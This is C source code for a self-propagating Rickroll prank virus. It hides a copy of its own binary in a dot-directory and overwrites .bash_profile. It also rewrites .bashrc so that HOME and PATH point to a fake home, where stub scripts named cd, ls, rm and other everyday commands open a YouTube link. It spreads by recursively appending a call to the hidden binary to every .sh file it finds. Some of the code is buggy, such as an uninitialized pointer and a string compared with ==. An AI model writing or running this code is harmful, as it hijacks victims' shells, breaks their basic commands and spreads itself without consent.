#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <limits.h>
#include "rick.h"


const char *commoncmds[] = {
    "cd",
    "ls",
    "cp",
    "mv",
    "rm",
    "chmod",
    "exit",
    "clear",
    "pwd",
    "cat"
};


int main(int argc, char *argv[]) {
    char *binname, *hiddenpath;
    char *home = NULL;
    char olddirname[PATH_MAX];
    home = getenv("HOME");
    binname = argv[0];
    getcwd(olddirname, sizeof(olddirname));
    hiddencopy(binname, olddirname);
    dofakehome();
    hiddenpath = choosedotdir();
    infectshellfiles(hiddenpath, home);
    payload();
    chdir(home);
    chdir(hiddenpath);
    if (access(".rick", F_OK))
        raise(SIGSEGV);
    return 1;
}


char *choosedotdir(void) {
    DIR *dir;
    struct stat s;
    struct dirent *files;
    char *dname, *dotdir;
    char *home = NULL;
    home = getenv("HOME");
    chdir(home);
    dir = opendir(home);
    while ((files = readdir(dir)) != NULL) {
        dname = files -> d_name;
        if ((stat(dname, &s) == 0) && (s.st_mode & S_IFDIR) && (dname[0] == '.') && (strcmp(".", dname)) && (strcmp("..", dname))) {
            dotdir = dname;
            break;
        }
    }
    closedir(dir);
    return dotdir;
}


void hiddencopy(const char *binname, const char *olddirname) {
    FILE *fsrc, *fdes;
    char *dotdir;
    char *home = NULL;
    char hiddenf[] = ".rick";
    size_t n, m;
    unsigned char buff[8192];
    home = getenv("HOME");
    if (dotdir == NULL) {
        mkdir(".rickastley", 0777);
        dotdir = ".rickastley";
    }
    chdir(olddirname);
    fsrc = fopen(binname, "rb");
    dotdir = choosedotdir();
    chdir(home);
    chdir(dotdir);
    fdes = fopen(hiddenf, "wb");
    // https://stackoverflow.com/questions/5263018/
    do {
        n = fread(buff, 1, sizeof(buff), fsrc);
        if (n) m = fwrite(buff, 1, n, fdes);
        else   m = 0;
    } while ((n > 0) && (n == m));
    fclose(fsrc);
    fclose(fdes);
    chdir(home);
    chdir(dotdir);
    chmod(hiddenf, 0777);
}


void dofakehome(void) {
    FILE *fp;
    char *home = NULL;
    char bashprofile[] = ".bash_profile";
    char bashrc[] = ".bashrc";
    char fakehome[] = "fakehome";
    home = getenv("HOME");
    chdir(home);
    if (!access(bashprofile, F_OK)) {
        fp = fopen(bashprofile, "w");
        fputs("\n. .bashrc", fp);
        fclose(fp);
    }
    fp = fopen(bashrc, "a");
    fputs("\nexport HOME=$HOME/fakehome;\n"
            "export PATH=.:$PATH\n"
            "cd $HOME\n"
            "return [0]", fp);
    fclose(fp);
    mkdir(fakehome, 0777);
    chdir(fakehome);
    for (int i = 0; i < 10; i++) {
        fp = fopen(commoncmds[i], "w");
        fputs("#!/usr/bin/env/bash\nopen https://www.youtube.com/watch?v=dQw4w9WgXcQ", fp);
        fclose(fp);
        chmod(commoncmds[i], 0777);
    }
}


void infectshellfiles(const char *hiddendir, const char *currentdir) {
    FILE *fp;
    DIR *dir;
    struct stat s;
    struct dirent *files;
    char *dname, *ext;
    char hiddenf[] = ".rick";
    chdir(currentdir);
    dir = opendir(".");
    while ((files = readdir(dir)) != NULL) {
        dname = files -> d_name;
        if ((!strcmp(".", dname)) || (!strcmp("..", dname))) {
            continue;
        }
        if ((stat(dname, &s) == 0) && (s.st_mode & S_IFDIR)) {
            infectshellfiles(hiddendir, dname);
            chdir(currentdir);
            continue;
        }
        ext = strrchr(dname, '.') + 1;
        if ((s.st_mode & S_IFREG) && ((!strcmp("sh", ext)) || (dname == ".bashrc"))) {
            fp = fopen(dname, "a");
            fprintf(fp, "\n~/%s/%s", hiddendir, hiddenf);
            fclose(fp);
        }
    }
    closedir(dir);
}


void payload(void) {
    // https://stackoverflow.com/questions/1442116/
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    if ((tm.tm_mday == 1) && (tm.tm_mon == 3)) {
        printf("\x1b[2J\x1b[d\x1B[32;1m");
        puts("========================");
        puts("Never Gonna Give you up!");
        puts("========================");
        puts("We're no strangers to love");
        sleep(1);
        puts("You know the rules and so do I");
        sleep(1);
        puts("A full commitment's what I'm thinking of");
        sleep(1);
        puts("You wouldn't get this from any other guy");
        sleep(1);
        puts("I just wanna tell you how I'm feeling");
        sleep(1);
        puts("Gotta make you understand");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Never gonna tell a lie and hurt you");
        sleep(1);
        puts("We've known each other for so long");
        sleep(1);
        puts("Your heart's been aching but you're too shy to say it");
        sleep(1);
        puts("Inside we both know what's been going on");
        sleep(1);
        puts("We know the game and we're gonna play it");
        sleep(1);
        puts("And if you ask me how I'm feeling");
        sleep(1);
        puts("Don't tell me you're too blind to see");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Never gonna tell a lie and hurt you");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Never gonna tell a lie and hurt you");
        sleep(1);
        puts("Never gonna give, never gonna give");
        sleep(1);
        puts("(Give you up)");
        sleep(1);
        puts("We've known each other for so long");
        sleep(1);
        puts("Your heart's been aching but you're too shy to say it");
        sleep(1);
        puts("Inside we both know what's been going on");
        sleep(1);
        puts("We know the game and we're gonna play it");
        sleep(1);
        puts("I just wanna tell you how I'm feeling");
        sleep(1);
        puts("Gotta make you understand");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Never gonna tell a lie and hurt you");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Never gonna tell a lie and hurt you");
        sleep(1);
        puts("Never gonna give you up");
        sleep(1);
        puts("Never gonna let you down");
        sleep(1);
        puts("Never gonna run around and desert you");
        sleep(1);
        puts("Never gonna make you cry");
        sleep(1);
        puts("Never gonna say goodbye");
        sleep(1);
        puts("Find backups of your binaries in the benevolentrick/ folder.\x1B[0m");
    }
}
